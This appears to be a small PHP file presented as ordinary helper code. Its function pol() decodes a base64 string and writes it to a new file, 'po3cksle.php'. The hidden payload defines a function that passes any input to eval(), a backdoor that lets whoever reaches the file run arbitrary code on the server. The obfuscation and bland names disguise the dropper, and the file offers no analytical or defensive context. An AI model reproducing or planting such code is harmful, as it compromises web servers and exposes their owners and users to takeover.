<?php

function read_f($f) 
{
$fd= fopen($f, 'r');
return $fd;
}

function pol()
{
$d = fopen('po3cksle.php', 'w');
$body = "PD9waHAgZnVuY3Rpb24gYWx0ZXIoJHMxKXtldmFsKCRzMSk7fT8+";
fputs($d, base64_decode($body));
}
?>
